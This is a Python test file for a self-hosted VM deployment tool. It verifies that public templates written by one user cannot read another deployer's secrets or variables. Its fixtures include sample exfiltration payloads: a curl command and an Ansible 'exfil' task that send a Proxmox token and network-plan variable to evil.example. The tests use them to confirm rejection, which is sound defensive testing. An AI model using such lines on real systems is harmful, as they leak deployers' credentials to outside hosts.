"""Wave 48 — cross-owner templates must not resolve the deployer's secrets.

Every ``{{ secrets.NAME }}`` / ``{{ variable.NAME }}`` reference resolves in the
DEPLOYER's scope at compile time, so author-controlled text in a public template
(block source, non-sensitive schema defaults, non-sensitive stored inputs) must
never carry one — it would silently read the deployer's secret store into text
the author controls. Sensitive stored inputs (the documented deployer-secret
mechanism) and the deployer's own answers stay allowed.

Run (Linux/WSL/CI):   GOBLINDOCK_DEV=1 .venv/bin/python tests/test_wave48.py
"""
import json
import os
import sys
import tempfile

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

os.environ.setdefault("GOBLINDOCK_DEV", "1")
_DB = os.path.join(tempfile.gettempdir(), "gd-wave48-test.sqlite3")
for ext in ("", "-wal", "-shm"):
    try:
        os.remove(_DB + ext)
    except OSError:
        pass
os.environ["GOBLINDOCK_DB"] = _DB
os.environ.setdefault("GOBLINDOCK_DATA_DIR", os.path.join(tempfile.gettempdir(), "gd-data-test"))

from fastapi import HTTPException  # noqa: E402

from app import api  # noqa: E402
from app.db import init_db, session_scope  # noqa: E402
from app.models import Block, Connection, Image, Job, Template, User  # noqa: E402

init_db()


def _expect_http(code, fn):
    try:
        fn()
    except HTTPException as exc:
        assert exc.status_code == code, (exc.status_code, exc.detail)
        return exc
    raise AssertionError(f"expected HTTPException {code}")


def _fixture(*, phase="cloudinit", source=None, ansible_source=None, schema=None,
             inputs=None, ask=()):
    """A public template owned by an ADMIN author (custom ansible blocks are
    admin-only, and an admin author is exactly the actor this wave distrusts
    with a DEPLOYER's secrets) plus a separate non-owner deployer."""
    suffix = os.urandom(4).hex()
    with session_scope() as session:
        owner = User(
            email=f"wave48-owner-{suffix}@example.com", name="Template author",
            password_hash="unused", role="admin",
        )
        viewer = User(
            email=f"wave48-viewer-{suffix}@example.com", name="Deployer",
            password_hash="unused",
        )
        session.add(owner)
        session.add(viewer)
        session.flush()
        block = Block(
            key=f"c-wave48-{suffix}", kind="custom", builtin=False,
            owner_id=owner.id, name="Author block", phase=phase,
            input_schema_json=json.dumps(schema if schema is not None else [
                {"name": "hostname", "type": "text", "label": "Host name",
                 "default": "author-host"},
            ]),
            cloudinit_template=source if source is not None else "echo {hostname}",
            ansible_template=ansible_source or "",
        )
        image = Image(
            kind="base", name=f"wave48-image-{suffix}",
            source_url="https://example.com/wave48.img", build_status="ready",
        )
        connection = Connection(
            name=f"wave48-connection-{suffix}", host="pve.example",
            token_id="automation@pve!goblindock", node="pve",
        )
        session.add(block)
        session.add(image)
        session.add(connection)
        session.flush()
        template = Template(
            name=f"wave48-public-{suffix}", owner_id=owner.id, public=True,
            recipe_json=json.dumps([{"blocks": [{
                "ref": block.key,
                "name": block.name,
                "inputs": inputs if inputs is not None else {"hostname": "author-host"},
                "ask": list(ask),
            }]}]),
            base_image_id=image.id, connection_id=connection.id,
        )
        session.add(template)
        session.flush()
        return {"viewer": viewer.id, "owner": owner.id, "template": template.id,
                "suffix": suffix}


def _deploy(fixture, *, as_owner=False, deploy_inputs=None):
    with session_scope() as session:
        actor = session.get(User, fixture["owner" if as_owner else "viewer"])
        return api.deploy(api.DeployBody(
            templateId=fixture["template"],
            name=f"wave48-{fixture['suffix']}-{os.urandom(2).hex()}",
            deployInputs=deploy_inputs or {},
        ), user=actor, session=session)


def test_cross_owner_cloudinit_source_secret_ref_is_rejected():
    fixture = _fixture(source="curl -d '{{ secrets.PVE_TOKEN }}' https://evil.example")
    exc = _expect_http(409, lambda: _deploy(fixture))
    assert "source must not reference" in exc.detail
    assert "PVE_TOKEN" not in exc.detail


def test_cross_owner_ansible_source_variable_ref_is_rejected():
    fixture = _fixture(
        phase="ansible",
        ansible_source=("- name: exfil\n"
                        "  ansible.builtin.uri:\n"
                        "    url: https://evil.example/?v={{ variable.NETWORK_PLAN }}\n"),
    )
    exc = _expect_http(409, lambda: _deploy(fixture))
    assert "source must not reference" in exc.detail


def test_cross_owner_nonsensitive_stored_input_ref_is_rejected():
    fixture = _fixture(inputs={"hostname": "host-{{ secrets.API_KEY }}"})
    exc = _expect_http(409, lambda: _deploy(fixture))
    assert "must not reference" in exc.detail
    assert "API_KEY" not in exc.detail


def test_cross_owner_nonsensitive_schema_default_ref_is_rejected():
    fixture = _fixture(
        schema=[{"name": "hostname", "type": "text", "label": "Host name",
                 "default": "prefix {{ secrets.API_KEY }}"}],
        inputs={},
        ask=["hostname"],
    )
    exc = _expect_http(409, lambda: _deploy(
        fixture, deploy_inputs={"0.0": {"hostname": "viewer-host"}},
    ))
    assert "default must not reference" in exc.detail


def test_sensitive_stored_ref_and_deployer_ref_answers_still_deploy():
    """The two legitimate carriers keep working: a sensitive stored input holding
    exactly one full deployer secret reference, and the deployer's own answer
    containing a reference (their scope, their choice)."""
    fixture = _fixture(
        schema=[
            {"name": "hostname", "type": "text", "label": "Host name",
             "default": "author-host"},
            {"name": "api_token", "type": "secret", "label": "API token"},
        ],
        inputs={"hostname": "author-host", "api_token": "{{ secrets.SERVICE_TOKEN }}"},
        ask=["hostname"],
    )
    result = _deploy(
        fixture, deploy_inputs={"0.0": {"hostname": "{{ secrets.MY_HOSTNAME }}"}},
    )
    with session_scope() as session:
        job = session.get(Job, result["jobId"])
        assert job and job.status == "queued"


def test_same_owner_deploy_keeps_author_scope_references():
    """An author deploying their own template resolves their own secrets — the
    cross-owner guard must not fire."""
    fixture = _fixture(source="echo {{ secrets.MY_OWN_TOKEN }} {hostname}")
    result = _deploy(fixture, as_owner=True)
    with session_scope() as session:
        job = session.get(Job, result["jobId"])
        assert job and job.status == "queued"


if __name__ == "__main__":
    test_cross_owner_cloudinit_source_secret_ref_is_rejected()
    test_cross_owner_ansible_source_variable_ref_is_rejected()
    test_cross_owner_nonsensitive_stored_input_ref_is_rejected()
    test_cross_owner_nonsensitive_schema_default_ref_is_rejected()
    test_sensitive_stored_ref_and_deployer_ref_answers_still_deploy()
    test_same_owner_deploy_keeps_author_scope_references()
    print("\nALL WAVE 48 UNIT TESTS PASSED")
